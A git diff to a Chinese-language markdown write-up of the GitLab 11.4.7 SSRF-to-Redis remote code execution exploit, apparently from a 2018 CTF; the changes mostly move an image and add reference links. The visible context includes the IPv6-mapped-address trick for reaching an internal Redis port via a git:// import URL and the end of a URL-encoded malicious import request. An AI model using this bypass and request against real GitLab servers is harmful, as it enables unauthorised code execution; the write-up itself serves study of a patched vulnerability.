@@ -3,15 +3,16 @@ GitLab 11.4.7 SSRF配合redis远程执行代码
 
 ## 0x01 SSRF
 #### register user test
-![](./gitlab_ssrf.jpg)
+
 ```
-gitlab >>import project>> Repo by URL >> Git repository URL (ipv6 Bypass block url)
+gitlab vuln: >>import project>> Repo by URL >> Git repository URL (ipv6 Bypass block url)
 
 Example:
 127.0.0.1:6379 >> [0:0:0:0:0:ffff:127.0.0.1]:6379
 git://[0:0:0:0:0:ffff:127.0.0.1]:6379/test/ssrf.git
 
 ```
+![](./gitlab_ssrf.jpg)
 
 ## 0x02 redis RCE
 
@@ -82,3 +83,8 @@ utf8=%E2%9C%93&authenticity_token=p7JycLd%2FiS7nEk30Ahi2i8oyEodZJ0V%2BBhCWtnKMMa
  exec
 &project%5Bci_cd_only%5D=false&project%5Bname%5D=&project%5Bnamespace_id%5D=2&project%5Bpath%5D=ssrf&project%5Bdescription%5D=&project%5Bvisibility_level%5D=0
 ```
+
+## 参考链接：
+
+https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/
+https://gitlab.com/gitlab-org/gitlab-ce/commit/ecbdef090277848d409ed7f97f69f53bbac7a92c#8da38c8f8d3f364231f4ee068986c220a6c54248
